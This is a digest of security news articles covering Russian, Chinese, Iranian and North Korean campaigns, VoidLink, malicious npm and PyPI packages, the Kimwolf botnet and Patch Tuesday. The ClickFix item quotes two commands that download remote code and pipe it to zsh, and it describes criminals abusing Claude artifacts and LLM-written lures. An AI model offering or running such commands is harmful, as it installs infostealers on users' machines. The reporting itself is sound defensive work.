A previously undocumented threat actor has been attributed to attacks targeting Ukrainian organizations with malware known as CANFAIL.

Google Threat Intelligence Group (GTIG) described the hacking group as possibly affiliated with Russian intelligence services. The threat actor is assessed to have targeted defense, military, government, and energy organizations within the Ukrainian regional and national governments.

However, the group has also exhibited growing interest in aerospace organizations, manufacturing companies with military and drone ties, nuclear and chemical research organizations, and international organizations involved in conflict monitoring and humanitarian aid in Ukraine, GTIG added.

"Despite being less sophisticated and resourced than other Russian threat groups, this actor recently began to overcome some technical limitations using LLMs [large language models]," GTIG said.

"Through prompting, they conduct reconnaissance, create lures for social engineering, and seek answers to basic technical questions for post-compromise activity and C2 infrastructure setup."

Recent phishing campaigns have involved the threat actor impersonating legitimate national and local Ukrainian energy organizations to obtain unauthorized access to organizational and personal email accounts.

The group is also said to have masqueraded as a Romanian energy company that works with customers in Ukraine, in addition to targeting a Romanian firm and conducting reconnaissance on Moldovan organizations.

To enable its operations, the threat actor generates email address lists tailored to specific regions and industries based on their research. The attack chains seemingly contain LLM-generated lures and embed Google Drive links pointing to a RAR archive containing CANFAIL malware.

Typically disguised with a double extension to pass off as a PDF document (*.pdf.js), CANFAIL is an obfuscated JavaScript malware that's designed to execute a PowerShell script that, in turn, downloads and executes a memory-only PowerShell dropper. In parallel, it displays a fake "error" message to the victim.

Google said the threat actor is also linked to a campaign called PhantomCaptcha that was disclosed by SentinelOne SentinelLABS in October 2025 as targeting organizations associated with Ukraine's war relief efforts through phishing emails that direct recipients to fake pages hosting ClickFix-style instructions to activate the infection sequence and deliver a WebSocket-based trojan.

Several state-sponsored actors, hacktivist entities, and criminal groups from China, Iran, North Korea, and Russia have trained their sights on the defense industrial base (DIB) sector, according to findings from Google Threat Intelligence Group (GTIG).

The tech giant's threat intelligence division said the adversarial targeting of the sector is centered around four key themes: striking defense entities deploying technologies on the battlefield in the Russia-Ukraine War, directly approaching employees and exploitation of the hiring process by North Korean and Iranian actors, use of edge devices and appliances as initial access pathways for China-nexus groups, and supply chain risk stemming from the breach of the manufacturing sector.

"Many of the chief state-sponsors of cyber espionage and hacktivist actors have shown an interest in autonomous vehicles and drones, as these platforms play an increasing role in modern warfare," GTIG said. "Further, the 'evasion of detection' trend [...] continues, as actors focus on single endpoints and individuals, or carry out intrusions in a manner that seeks to avoid endpoint detection and response (EDR) tools altogether."

Some of the notable threat actors that have participated in the activity include -

APT44 (aka Sandworm) has attempted to exfiltrate information from Telegram and Signal encrypted messaging applications, likely after securing physical access to devices obtained during on-ground operations in Ukraine. This includes the use of a Windows batch script called WAVESIGN to decrypt and exfiltrate data from Signal's desktop app.

TEMP.Vermin (aka UAC-0020) has used malware like VERMONSTER, SPECTRUM (aka SPECTR), and FIRMACHAGENT using lure content revolving around drone production and development, anti-drone defense systems, and video surveillance security systems.

UNC5125 (aka FlyingYeti and UAC-0149) has conducted highly targeted campaigns focusing on frontline drone units. It has used a questionnaire hosted on Google Forms to conduct reconnaissance against prospective drone operators, and distributed via messaging apps malware like MESSYFORK (aka COOKBOX) to an Unmanned Aerial Vehicle (UAV) operator based in Ukraine.

UNC5125 is also said to have leveraged an Android malware called GREYBATTLE, a bespoke version of the Hydra banking trojan, to steal credentials and data by distributing it via a website spoofing a Ukrainian military artificial intelligence company.

UNC5792 (aka UAC-0195) has exploited secure messaging apps to target Ukrainian military and government entities, as well as individuals and organizations in Moldova, Georgia, France, and the U.S. The threat actor is notable for weaponizing Signal's device linking feature to hijack victim accounts.

UNC5976, a Russian espionage cluster that has conducted a phishing campaign delivering malicious RDP connection files that are configured to communicate with actor-controlled domains mimicking a Ukrainian telecommunications company.

UNC6096, a Russian espionage cluster that has conducted malware delivery operations via WhatsApp using DELTA-related themes to deliver a malicious LNK shortcut within an archive file that downloads a secondary payload. Attacks aimed at Android devices have been found to deliver malware called GALLGRAB that collects locally stored files, contact information, and potentially encrypted user data from specialized battlefield applications.

UNC5114, a suspected Russian espionage cluster that has delivered a variant of an off-the-shelf Android malware called CraxsRAT by masquerading it as an update for Kropyva, a combat control system used in Ukraine.

APT45 (aka Andariel) has targeted South Korean defense, semiconductor, and automotive manufacturing entities with SmallTiger malware.

APT43 (aka Kimsuky) has likely leveraged infrastructure mimicking German and U.S. defense-related entities to deploy a backdoor called THINWAVE.

UNC2970 (aka Lazarus Group) has conducted the Operation Dream Job campaign to target aerospace, defense, and energy sectors, in addition to relying on artificial intelligence (AI) tools to conduct reconnaissance on its targets.

UNC1549 (aka Nimbus Manticore) has targeted aerospace, aviation, and defense industries in the Middle East with malware families like MINIBIKE, TWOSTROKE, DEEPROOT, and CRASHPAD. The group is known to orchestrate Lazarus Group-style Dream Job campaigns to trick users into executing malware or giving up credentials under the guise of legitimate employment opportunities.

UNC6446, an Iranian-nexus threat actor that has used resume builder and personality test applications to distribute custom malware to targets in the aerospace and defense vertical across the U.S. and the Middle East.

APT5 (aka Keyhole Panda and Mulberry Typhoon) has targeted current and former employees of major aerospace and defense contractors with tailored phishing lures.

UNC3236 (aka Volt Typhoon) has conducted reconnaissance activity against publicly hosted login portals of North American military and defense contractors, while using the ARCMAZE obfuscation framework to conceal its origin.

UNC6508, a China-nexus threat cluster that targeted a U.S.-based research institution in late 2023 by leveraging a REDCap exploit to drop a custom malware named INFINITERED that's capable of persistent remote access and credential theft after intercepting the application's software upgrade process.

In addition, Google said it has also observed China-nexus threat groups utilizing operational relay box (ORB) networks for reconnaissance against defense industrial targets, thereby complicating detection and attribution efforts.

ORBs confer several advantages to threat actors, allowing them to route their traffic through home or commercial networks, blend with regular network traffic, circumvent geofencing security controls, and pre-position themselves to a target's perimeter ahead of a cyber attack. ORBs are also resilient to takedown attempts, as attackers managing them can scale these networks to add more devices, even if some nodes are discovered and blocked.

"While specific risks vary by geographic footprint and sub-sector specialization, the broader trend is clear: the defense industrial base is under a state of constant, multi-vector siege," Google said. "Financially motivated actors carry out extortion against this sector and the broader manufacturing base, like many of the other verticals they target for monetary gain."

"The campaigns against defense contractors in Ukraine, threats to or exploitation of defense personnel, the persistent volume of intrusions by China-nexus actors, and the hack, leak, and disruption of the manufacturing base are some of the leading threats to this industry today."

[3] The Hacker News - UAT-9921 Deploys VoidLink Malware to Target Technology and Financial Sectors
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 20:53:00 +0530
Link: https://thehackernews.com/2026/02/uat-9921-deploys-voidlink-malware-to.html

[TAM METİN - 723 kelime]
A previously unknown threat actor tracked as UAT-9921 has been observed leveraging a new modular framework called VoidLink in its campaigns targeting the technology and financial services sectors, according to findings from Cisco Talos.

"This threat actor seems to have been active since 2019, although they have not necessarily used VoidLink over the duration of their activity," researchers Nick Biasini, Aaron Boyd, Asheer Malhotra, and Vitor Ventura said. "UAT-9921 uses compromised hosts to install VoidLink command-and-control (C2), which are then used to launch scanning activities both internal and external to the network."

VoidLink was first documented by Check Point last month, describing it as a feature-rich malware framework written in Zig designed for long-term, stealthy access to Linux-based cloud environments. It's assessed to be the work of a single developer with assistance from a large language model (LLM) to flesh out its internals based on a paradigm called spec-driven development.

In another analysis published earlier this week, Ontinue pointed out that the emergence of VoidLink presents a new concern where LLM-generated implants, packed with kernel-level rootkits and features to target cloud environments, can further lower the skill barrier required to produce hard-to-detect malware.

Per Talos, UAT-9921 is believed to possess knowledge of the Chinese language, given the language of the framework and code comments present in it. The toolkit is said to be a recent addition to its arsenal. It is also believed that the development was split across teams, although the extent of the demarcation between development and the actual operations remains unclear.

"The operators deploying VoidLink have access to the source code of some [kernel] modules and some tools to interact with the implants without the C2," the researchers noted. "This indicates inner knowledge of the communication protocols of the implants."

VoidLink is deployed as a post-compromise tool, allowing the adversary to sidestep detection. The threat actor has also been observed deploying a SOCKS proxy on compromised servers to launch scans for internal reconnaissance and lateral movement using open-source tools like Fscan.

The cybersecurity company said it's aware of multiple VoidLink-related victims dating back to September 2025, indicating that work on the malware may have commenced much earlier than the November 2025 timeline pieced together by Check Point.

When reached for comment regarding the latest findings, Pedro Drimel Neto, malware analysis lead at Check Point Software, told The Hacker News via email that they have not observed evidence of VoidLink "being used as of September 2025 and threat actor activity since 2019," and that "we cannot independently verify activity outside of the datasets and sources available to us."

VoidLink uses three different programming languages: ZigLang for the implant, C for the plugins, and GoLang for the backend. It supports compilation on demand for plugins, providing support for the different Linux distributions that might be targeted. The plugins allow for gathering information, lateral movement, and anti-forensics.

The framework also comes fitted with a wide range of stealth mechanisms to hinder analysis, prevent its removal from the infected hosts, and even detect endpoint detection and response (EDR) solutions and devise an evasion strategy on the fly.

"The C2 will provide that implant with a plugin to read a specific database the operator has found or an exploit for a known vulnerability, which just happens to be on an internal web server," Talos said.

"The C2 doesn't necessarily need to have all these tools available — it may have an agent that will do its research and prepare the tool for the operator to use. With the current VoidLink compile-on-demand capability, integrating such a feature should not be complex. Keep in mind that all of this will happen while the operator continues to explore the environment."

Another defining trait of VoidLink is its auditability and the existence of a role-based access control (RBAC) mechanism, which consists of three role levels: SuperAdmin, Operator, and Viewer. This suggests that the developers of the framework kept oversight in mind when designing it, raising the possibility that the activity may be part of red team exercises.

What's more, there are signs that there exists a main implant that has been compiled for Windows and can load plugins via a technique called DLL side-loading.

"This is a near-production-ready proof of concept," Talos said. "VoidLink is positioned to become an even more powerful framework based on its capabilities and flexibility."

[4] BleepingComputer - Fake job recruiters hide malware in developer coding challenges
────────────────────────────────────────────────────────────────────────────────
Tarih: Fri, 13 Feb 2026 17:35:37 -0500
Link: https://www.bleepingcomputer.com/news/security/fake-job-recruiters-hide-malware-in-developer-coding-challenges/

[TAM METİN - 718 kelime]
A new variation of the fake recruiter campaign from North Korean threat actors is targeting JavaScript and Python developers with cryptocurrency-related tasks.

The activity has been ongoing since at least May 2025 and is characterized by modularity, which allows the threat actor to quickly resume it in case of partial compromise.

The bad actor relies on packages published on the npm and PyPi registries that act as downloaders for a remote access trojan (RAT). In total, researchers found 192 malicious packages related to this campaign, which they dubbed 'Graphalgo'.

Researchers at software supply-chain security company ReversingLabs say that the threat actor creates fake companies in the blockchain and crypto-trading sectors and publishes job offerings on various platforms, like LinkedIn, Facebook, and Reddit.

Developers applying for the job are required to show their skills by running, debugging, and improving a given project. However, the attacker's purpose is to make the applicant run the code.

This action would cause a malicious dependency from a legitimate repository to be installed and executed.

"It is easy to create such job task repositories. Threat actors simply need to take a legitimate bare-bone project and fix it up with a malicious dependency and it is ready to be served to targets," the researchers say.

To hide the malicious nature of the dependencies, the hackers host the dependencies on legitimate platforms, like npm and PyPi.

In one case highlighted in the ReversingLabs report, a package named ‘bigmathutils,’ with 10,000 downloads, was benign until it reached version 1.1.0, which introduced malicious payloads. Shortly after, the threat actor removed the package, marking it as deprecated, likely to conceal the activity.

The Graphalgo name of the campaign is derived from packages that have “graph” in their name. They typically impersonate legitimate, popular libraries like graphlib, the researchers say.

However, from December 2025 onward, the North Korean actor shifted to packages with “big” in their name. However, ReversingLabs has not discovered the recruiting part, or the campaign frontend, related to them.

According to the researchers, the actor uses Github Organizations, which are shared accounts for collaboration across multiple projects. They say that the GitHub repositories are clean, and malicious code is introduced indirectly via dependencies hosted on npm and PyPI, which are the Graphalgo packages.

Victims running the project as instructed in the interview infect their systems with these packages, which install a RAT payload on their machines.

It is worth noting that ReversingLabs researchers identified several developers that fell for the trick and contacted them for more details about the recruiting process.

The RAT can list the running processes on the host, execute arbitrary commands per instructions from the command-and-control (C2) server, and exfiltrate files or drop additional payloads.

The RAT checks whether the MetaMask cryptocurrency extension is installed on the victim’s browser, a clear indication of its money-stealing goals.

Its C2 communication is token-protected to lock out unauthorized observers, a common tactic for North Korean hackers.

ReversingLabs has found multiple variants written in JavaScript, Python, and VBS, showing an intention to cover all possible targets.

The researchers’ attribute the Graphalgo fake recruiter campaign to the Lazarus group with medium-to-high confidence. The conclusion is based on the approach, the use of coding tests as an infection vector, and the cryptocurrency-focused targeting, all of which aligning with previous activity associated with the North Korean threat actor.

Also, the researchers note the delayed activation of malicious code in the packages, consistent with Lazarus' patience displayed in other attacks. Finally, the Git commits show the GMT +9 time zone, matching North Korea time.

The complete indicators of compromise (IoCs) are available in the original report. Developers who installed the malicious packages at any point should rotate all tokens and account passwords and reinstall their OS.

[5] BleepingComputer - Claude LLM artifacts abused to push Mac infostealers in ClickFix attack
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 616 kelime]
Threat actors are abusing Claude artifacts and Google Ads in ClickFix campaigns that deliver infostealer malware to macOS users searching for specific queries.

At least two variants of the malicious activity have been observed in the wild, and more than 10,000 users have accessed the content with dangerous instructions.

A Claude artifact is content generated with Antropic’s LLM that has been made public by the author. It can be anything from instructions, guides, chunks of code, or other types of output that are isolated from the main chat and accessible to anyone via links hosted on the claude.ai domain.

An artifact's page warns users that the shown content was generated by the user and has not been verified for accuracy.

Researchers at MacPaw's investigative division, Moonlock Lab, and at ad-blocking company AdGuard noticed the malicious search results being displayed for multiple queries, like “online DNS resolver,” “macOS CLI disk space analyzer,” and “HomeBrew.”

Malicious results promoted on Google Search lead to either a public Claude artifact or a Medium article impersonating Apple Support. In both cases, the user is instructed to paste a shell command into Terminal.

In the first variant of the attack, the command given for execution is: ‘echo "..." | base64 -D | zsh,’

while in the second, it’s: ‘true && cur""l -SsLfk --compressed "https://raxelpak[.]com/curl/[hash]" | zsh’.

Moonlock researchers discovered that the malicious Claude guide has already received at least 15,600 views, which could be an indication of the number of users falling for the trick.

AdGuard researchers observed the same guide a few days earlier, when it had 12,300 views.

Running the command in Terminal fetches a malware loader for the MacSync infostealer, which exfiltrates sensitive information present on the system.

According to the researchers, the malware establishes communication with the command-and-control (C2) infrastructure using a hardcoded token and API key, and spoofs a macOS browser user-agent to blend into normal activity.

"The response is piped directly to osascript – the AppleScript handles the actual stealing (keychain, browser data, crypto wallets)," the researchers say.

The stolen data is packaged into an archive at ‘/tmp/osalogging.zip,’ and then exfiltrated to the attacker's C2 at a2abotnet[.]com/gate via an HTTP POST request. In case of failure, the archive is split into smaller chunks, and exfiltration is retried eight times. After a successful upload, a cleanup step deletes all traces.

MoonLock Lab found that both variants fetch the second stage from the same C2 address, indicating that the same threat actor is behind the observed activity.

A similar campaign leveraged the chat sharing feature in ChatGPT and Grok to deliver the AMOS infostealer. In December 2025, researchers found the promoted  after researchers found ChatGPT and Grok conversations were being leveraged in ClickFix attacks targeting Mac users.

The Claude variation of the attack indicates that abuse has expanded to other large language models (LLMs).

Users are recommended to exert caution and avoid executing in Terminal commands they don't fully understand. As Kaspersky researchers noted in the past, asking the chatbot in the same conversation about the safety of the provided commands is a straightforward way to determine if they're safe or not.

[6] BleepingComputer - Louis Vuitton, Dior, and Tiffany fined $25 million over data breaches
────────────────────────────────────────────────────────────────────────────────

[TAM METİN - 565 kelime]
South Korea has fined luxury fashion brands Louis Vuitton, Christian Dior Couture, and Tiffany $25 million for failing to implement adequate security measures, which facilitated unauthorized access and the exposure of data belonging to more than 5.5 million customers.

All three brands are part of the Louis Vuitton Moët Hennessy (LVMH) group and suffered data breaches [1, 2, 3] after hackers gained access to their cloud-based customer management service.

The Personal Information Protection Commission (PIPC) in South Korea says that in the case of Louis Vuitton, an employee’s device was infected with malware, which led to compromising their software-as-a-service (SaaS) and leaking of data for 3.6 million customers.

Although the product isn’t named, Google researchers linked the campaigns to the ShinyHunters gang, who targeted Salesforce platforms. The threat actor later claimed the breach of LVMH systems.

The breaches at the three regional brands last year exposed sensitive customer data, including names, phone numbers, email addresses, postal addresses, and purchase histories.

PIPC says that Louis Vuitton had been operating the SaaS tool since 2013, but "did not restrict access rights to Internet Protocol (IP) addresses, etc., and did not apply secure authentication methods when personal information handlers accessed the service from outside."

For failing to adequately secure access to customer data, the South Korean data protection agency imposed a $16.4 million fine on Louis Vuitton and ordered the company to announce the penalty on its business website.

At Dior, the breach occurred via a phishing attack on a customer service employee, who was tricked into granting the hacker access to the SaaS system, exposing data for 1.95 million customers.

Dior had been using the system since 2020, but didn’t implement allow-lists, didn’t place bulk data download restrictions, and failed to inspect access logs, delaying the discovery of the breach for over three months.

Additionally, Dior South Korea disclosed the breach to PIPC five days after learning about it. Under PIPA, organizations are required to notify the data protection agency within 72 hours from the time of becoming aware of a personal information leak.

Due to these violations, PIPC announced a $9.4 million financial penalty for Dior South Korea.

Tiffany was breached in a similar way, with attackers using voice phishing to trick a customer service employee into giving them access to the SaaS system. However, the impact was far lower in this case, with 4,600 clients exposed.

Similar to the other two cases, Tiffany also neglected to implement IP-based access controls and bulk data download restrictions and did not notify impacted individuals within the legally specified time frame. The brand received a $1.85 million fine.

PIPC emphasized that SaaS solutions do not exempt companies from their responsibility to securely manage client data, nor does it transfer that responsibility to the vendors of these solutions.

[7] Krebs on Security - Kimwolf Botnet Lurking in Corporate, Govt. Networks
────────────────────────────────────────────────────────────────────────────────
Tarih: Tue, 20 Jan 2026 18:19:13 +0000
Link: https://krebsonsecurity.com/2026/01/kimwolf-botnet-lurking-in-corporate-govt-networks/

[TAM METİN - 992 kelime]
A new Internet-of-Things (IoT) botnet called Kimwolf has spread to more than 2 million devices, forcing infected systems to participate in massive distributed denial-of-service (DDoS) attacks and to relay other malicious and abusive Internet traffic. Kimwolf’s ability to scan the local networks of compromised systems for other IoT devices to infect makes it a sobering threat to organizations, and new research reveals Kimwolf is surprisingly prevalent in government and corporate networks.

Image: Shutterstock, @Elzicon.

Kimwolf grew rapidly in the waning months of 2025 by tricking various “residential proxy” services into relaying malicious commands to devices on the local networks of those proxy endpoints. Residential proxies are sold as a way to anonymize and localize one’s Web traffic to a specific region, and the biggest of these services allow customers to route their Internet activity through devices in virtually any country or city around the globe.

The malware that turns one’s Internet connection into a proxy node is often quietly bundled with various mobile apps and games, and it typically forces the infected device to relay malicious and abusive traffic — including ad fraud, account takeover attempts, and mass content-scraping.

Kimwolf mainly targeted proxies from IPIDEA, a Chinese service that has millions of proxy endpoints for rent on any given week. The Kimwolf operators discovered they could forward malicious commands to the internal networks of IPIDEA proxy endpoints, and then programmatically scan for and infect other vulnerable devices on each endpoint’s local network.

Most of the systems compromised through Kimwolf’s local network scanning have been unofficial Android TV streaming boxes. These are typically Android Open Source Project devices — not Android TV OS devices or Play Protect certified Android devices — and they are generally marketed as a way to watch unlimited (read:pirated) video content from popular subscription streaming services for a one-time fee.

However, a great many of these TV boxes ship to consumers with residential proxy software pre-installed. What’s more, they have no real security or authentication built-in: If you can communicate directly with the TV box, you can also easily compromise it with malware.

While IPIDEA and other affected proxy providers recently have taken steps to block threats like Kimwolf from going upstream into their endpoints (reportedly with varying degrees of success), the Kimwolf malware remains on millions of infected devices.

A screenshot of IPIDEA’s proxy service.

Kimwolf’s close association with residential proxy networks and compromised Android TV boxes might suggest we’d find relatively few infections on corporate networks. However, the security firm Infoblox said a recent review of its customer traffic found nearly 25 percent of them made a query to a Kimwolf-related domain name since October 1, 2025, when the botnet first showed signs of life.

Infoblox found the affected customers are based all over the world and in a wide range of industry verticals, from education and healthcare to government and finance.

“To be clear, this suggests that nearly 25% of customers had at least one device that was an endpoint in a residential proxy service targeted by Kimwolf operators,” Infoblox explained. “Such a device, maybe a phone or a laptop, was essentially co-opted by the threat actor to probe the local network for vulnerable devices. A query means a scan was made, not that new devices were compromised. Lateral movement would fail if there were no vulnerable devices to be found or if the DNS resolution was blocked.”

Synthient, a startup that tracks proxy services and was the first to disclose on January 2 the unique methods Kimwolf uses to spread, found proxy endpoints from IPIDEA were present in alarming numbers at government and academic institutions worldwide. Synthient said it spied at least 33,000 affected Internet addresses at universities and colleges, and nearly 8,000 IPIDEA proxies within various U.S. and foreign government networks.

The top 50 domain names sought out by users of IPIDEA’s residential proxy service, according to Synthient.

In a webinar on January 16, experts at the proxy tracking service Spur profiled Internet addresses associated with IPIDEA and 10 other proxy services that were thought to be vulnerable to Kimwolf’s tricks. Spur found residential proxies in nearly 300 government owned and operated networks, 318 utility companies, 166 healthcare companies or hospitals, and 141 companies in banking and finance.

“I looked at the 298 [government] owned and operated [networks], and so many of them were DoD [U.S. Department of Defense], which is kind of terrifying that DoD has IPIDEA and these other proxy services located inside of it,” Spur Co-Founder Riley Kilmer said. “I don’t know how these enterprises have these networks set up. It could be that [infected devices] are segregated on the network, that even if you had local access it doesn’t really mean much. However, it’s something to be aware of. If a device goes in, anything that device has access to the proxy would have access to.”

Kilmer said Kimwolf demonstrates how a single residential proxy infection can quickly lead to bigger problems for organizations that are harboring unsecured devices behind their firewalls, noting that proxy services present a potentially simple way for attackers to probe other devices on the local network of a targeted organization.

“If you know you have [proxy] infections that are located in a company, you can chose that [network] to come out of and then locally pivot,” Kilmer said. “If you have an idea of where to start or look, now you have a foothold in a company or an enterprise based on just that.”

This is the third story in our series on the Kimwolf botnet. Next week, we’ll shed light on the myriad China-based individuals and companies connected to the Badbox 2.0 botnet, the collective name given to a vast number of Android TV streaming box models that ship with no discernible security or authentication built-in, and with residential proxy malware pre-installed.

[8] Krebs on Security - Patch Tuesday, January 2026 Edition
────────────────────────────────────────────────────────────────────────────────
Tarih: Wed, 14 Jan 2026 00:47:38 +0000
Link: https://krebsonsecurity.com/2026/01/patch-tuesday-january-2026-edition/

[TAM METİN - 910 kelime]
Microsoft today issued patches to plug at least 113 security holes in its various Windows operating systems and supported software. Eight of the vulnerabilities earned Microsoft’s most-dire “critical” rating, and the company warns that attackers are already exploiting one of the bugs fixed today.

January’s Microsoft zero-day flaw — CVE-2026-20805 — is brought to us by a flaw in the Desktop Window Manager (DWM), a key component of Windows that organizes windows on a user’s screen. Kev Breen, senior director of cyber threat research at Immersive, said despite awarding CVE-2026-20805 a middling CVSS score of 5.5, Microsoft has confirmed its active exploitation in the wild, indicating that threat actors are already leveraging this flaw against organizations.

Breen said vulnerabilities of this kind are commonly used to undermine Address Space Layout Randomization (ASLR), a core operating system security control designed to protect against buffer overflows and other memory-manipulation exploits.

“By revealing where code resides in memory, this vulnerability can be chained with a separate code execution flaw, transforming a complex and unreliable exploit into a practical and repeatable attack,” Breen said. “Microsoft has not disclosed which additional components may be involved in such an exploit chain, significantly limiting defenders’ ability to proactively threat hunt for related activity. As a result, rapid patching currently remains the only effective mitigation.”

Chris Goettl, vice president of product management at Ivanti, observed that CVE-2026-20805 affects all currently supported and extended security update supported versions of the Windows OS. Goettl said it would be a mistake to dismiss the severity of this flaw based on its “Important” rating and relatively low CVSS score.

“A risk-based prioritization methodology warrants treating this vulnerability as a higher severity than the vendor rating or CVSS score assigned,” he said.

Among the critical flaws patched this month are two Microsoft Office remote code execution bugs (CVE-2026-20952 and CVE-2026-20953) that can be triggered just by viewing a booby-trapped message in the Preview Pane.

Our October 2025 Patch Tuesday “End of 10” roundup noted that Microsoft had removed a modem driver from all versions after it was discovered that hackers were abusing a vulnerability in it to hack into systems. Adam Barnett at Rapid7 said Microsoft today removed another couple of modem drivers from Windows for a broadly similar reason: Microsoft is aware of functional exploit code for an elevation of privilege vulnerability in a very similar modem driver, tracked as CVE-2023-31096.

“That’s not a typo; this vulnerability was originally published via MITRE over two years ago, along with a credible public writeup by the original researcher,” Barnett said. “Today’s Windows patches remove agrsm64.sys and agrsm.sys. All three modem drivers were originally developed by the same now-defunct third party, and have been included in Windows for decades. These driver removals will pass unnoticed for most people, but you might find active modems still in a few contexts, including some industrial control systems.”

According to Barnett, two questions remain: How many more legacy modem drivers are still present on a fully-patched Windows asset; and how many more elevation-to-SYSTEM vulnerabilities will emerge from them before Microsoft cuts off attackers who have been enjoying “living off the land[line] by exploiting an entire class of dusty old device drivers?”

“Although Microsoft doesn’t claim evidence of exploitation for CVE-2023-31096, the relevant 2023 write-up and the 2025 removal of the other Agere modem driver have provided two strong signals for anyone looking for Windows exploits in the meantime,” Barnett said. “In case you were wondering, there is no need to have a modem connected; the mere presence of the driver is enough to render an asset vulnerable.”

Immersive, Ivanti and Rapid7 all called attention to CVE-2026-21265, which is a critical Security Feature Bypass vulnerability affecting Windows Secure Boot. This security feature is designed to protect against threats like rootkits and bootkits, and it relies on a set of certificates that are set to expire in June 2026 and October 2026. Once these 2011 certificates expire, Windows devices that do not have the new 2023 certificates can no longer receive Secure Boot security fixes.

Barnett cautioned that when updating the bootloader and BIOS, it is essential to prepare fully ahead of time for the specific OS and BIOS combination you’re working with, since incorrect remediation steps can lead to an unbootable system.

“Fifteen years is a very long time indeed in information security, but the clock is running out on the Microsoft root certificates which have been signing essentially everything in the Secure Boot ecosystem since the days of Stuxnet,” Barnett said. “Microsoft issued replacement certificates back in 2023, alongside CVE-2023-24932 which covered relevant Windows patches as well as subsequent steps to remediate the Secure Boot bypass exploited by the BlackLotus bootkit.”

Goettl noted that Mozilla has released updates for Firefox and Firefox ESR resolving a total of 34 vulnerabilities, two of which are suspected to be exploited (CVE-2026-0891 and CVE-2026-0892). Both are resolved in Firefox 147 (MFSA2026-01) and CVE-2026-0891 is resolved in Firefox ESR 140.7 (MFSA2026-03).

“Expect Google Chrome and Microsoft Edge updates this week in addition to a high severity vulnerability in Chrome WebView that was resolved in the January 6 Chrome update (CVE-2026-0628),” Goettl said.

As ever, the SANS Internet Storm Center has a per-patch breakdown by severity and urgency. Windows admins should keep an eye on askwoody.com for any news about patches that don’t quite play nice with everything. If you experience any issues related installing January’s patches, please drop a line in the comments below.

[9] Krebs on Security - Who Benefited from the Aisuru and Kimwolf Botnets?
────────────────────────────────────────────────────────────────────────────────
Tarih: Thu, 08 Jan 2026 23:23:43 +0000
Link: https://krebsonsecurity.com/2026/01/who-benefited-from-the-aisuru-and-kimwolf-botnets/

[TAM METİN - 1877 kelime]
Our first story of 2026 revealed how a destructive new botnet called Kimwolf has infected more than two million devices by mass-compromising a vast number of unofficial Android TV streaming boxes. Today, we’ll dig through digital clues left behind by the hackers, network operators and services that appear to have benefitted from Kimwolf’s spread.

On Dec. 17, 2025, the Chinese security firm XLab published a deep dive on Kimwolf, which forces infected devices to participate in distributed denial-of-service (DDoS) attacks and to relay abusive and malicious Internet traffic for so-called “residential proxy” services.

The software that turns one’s device into a residential proxy is often quietly bundled with mobile apps and games. Kimwolf specifically targeted residential proxy software that is factory installed on more than a thousand different models of unsanctioned Android TV streaming devices. Very quickly, the residential proxy’s Internet address starts funneling traffic that is linked to ad fraud, account takeover attempts and mass content scraping.

The XLab report explained its researchers found “definitive evidence” that the same cybercriminal actors and infrastructure were used to deploy both Kimwolf and the Aisuru botnet — an earlier version of Kimwolf that also enslaved devices for use in DDoS attacks and proxy services.

XLab said it suspected since October that Kimwolf and Aisuru had the same author(s) and operators, based in part on shared code changes over time. But it said those suspicions were confirmed on December 8 when it witnessed both botnet strains being distributed by the same Internet address at 93.95.112[.]59.

Public records show the Internet address range flagged by XLab is assigned to Lehi, Utah-based Resi Rack LLC. Resi Rack’s website bills the company as a “Premium Game Server Hosting Provider.” Meanwhile, Resi Rack’s ads on the Internet moneymaking forum BlackHatWorld refer to it as a “Premium Residential Proxy Hosting and Proxy Software Solutions Company.”

Resi Rack co-founder Cassidy Hales told KrebsOnSecurity his company received a notification on December 10 about Kimwolf using their network “that detailed what was being done by one of our customers leasing our servers.”

“When we received this email we took care of this issue immediately,” Hales wrote in response to an email requesting comment. “This is something we are very disappointed is now associated with our name and this was not the intention of our company whatsoever.”

The Resi Rack Internet address cited by XLab on December 8 came onto KrebsOnSecurity’s radar more than two weeks before that. Benjamin Brundage is founder of Synthient, a startup that tracks proxy services. In late October 2025, Brundage shared that the people selling various proxy services which benefitted from the Aisuru and Kimwolf botnets were doing so at a new Discord server called resi[.]to.

On November 24, 2025, a member of the resi-dot-to Discord channel shares an IP address responsible for proxying traffic over Android TV streaming boxes infected by the Kimwolf botnet.

When KrebsOnSecurity joined the resi[.]to Discord channel in late October as a silent lurker, the server had fewer than 150 members, including “Shox” — the nickname used by Resi Rack’s co-founder Mr. Hales — and his business partner “Linus,” who did not respond to requests for comment.

Other members of the resi[.]to Discord channel would periodically post new IP addresses that were responsible for proxying traffic over the Kimwolf botnet. As the screenshot from resi[.]to above shows, that Resi Rack Internet address flagged by XLab was used by Kimwolf to direct proxy traffic as far back as November 24, if not earlier. All told, Synthient said it tracked at least seven static Resi Rack IP addresses connected to Kimwolf proxy infrastructure between October and December 2025.

Neither of Resi Rack’s co-owners responded to follow-up questions. Both have been active in selling proxy services via Discord for nearly two years. According to a review of Discord messages indexed by the cyber intelligence firm Flashpoint, Shox and Linus spent much of 2024 selling static “ISP proxies” by routing various Internet address blocks at major U.S. Internet service providers.

In February 2025, AT&T announced that effective July 31, 2025, it would no longer originate routes for network blocks that are not owned and managed by AT&T (other major ISPs have since made similar moves). Less than a month later, Shox and Linus told customers they would soon cease offering static ISP proxies as a result of these policy changes.

Shox and Linux, talking about their decision to stop selling ISP proxies.

The stated owner of the resi[.]to Discord server went by the abbreviated username “D.” That initial appears to be short for the hacker handle “Dort,” a name that was invoked frequently throughout these Discord chats.

Dort’s profile on resi dot to.

This “Dort” nickname came up in KrebsOnSecurity’s recent conversations with “Forky,” a Brazilian man who acknowledged being involved in the marketing of the Aisuru botnet at its inception in late 2024. But Forky vehemently denied having anything to do with a series of massive and record-smashing DDoS attacks in the latter half of 2025 that were blamed on Aisuru, saying the botnet by that point had been taken over by rivals.

Forky asserts that Dort is a resident of Canada and one of at least two individuals currently in control of the Aisuru/Kimwolf botnet. The other individual Forky named as an Aisuru/Kimwolf botmaster goes by the nickname “Snow.”

On January 2 — just hours after our story on Kimwolf was published — the historical chat records on resi[.]to were erased without warning and replaced by a profanity-laced message for Synthient’s founder. Minutes after that, the entire server disappeared.

Later that same day, several of the more active members of the now-defunct resi[.]to Discord server moved to a Telegram channel where they posted Brundage’s personal information, and generally complained about being unable to find reliable “bulletproof” hosting for their botnet.

